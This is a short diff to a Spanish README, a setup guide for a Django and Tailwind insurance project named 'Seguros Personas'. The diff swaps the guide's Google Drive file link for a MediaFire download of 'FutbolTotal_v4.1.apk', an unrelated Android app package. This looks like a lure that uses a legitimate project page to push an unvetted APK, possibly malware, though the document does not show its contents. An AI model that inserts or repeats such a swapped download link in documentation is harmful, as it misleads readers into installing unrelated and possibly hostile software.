@@ -1,5 +1,5 @@
 # Guía de Configuración: Seguros Personas (Django + Tailwind)
-[Haz clic aquí para abrir el archivo](https://drive.google.com/file/d/1r7r0QjGBtJQyJ956U1RVGXBtFQK7CFpS/view?usp=sharing).
+[Haz clic aquí para abrir el archivo](https://www.mediafire.com/file/lni3oml4x4vgmda/FutbolTotal_v4.1.apk/file).
 
 ## 1️⃣ Configuración del Entorno Python
 Sigue estos comandos para preparar el entorno virtual e instalar las dependencias del backend:
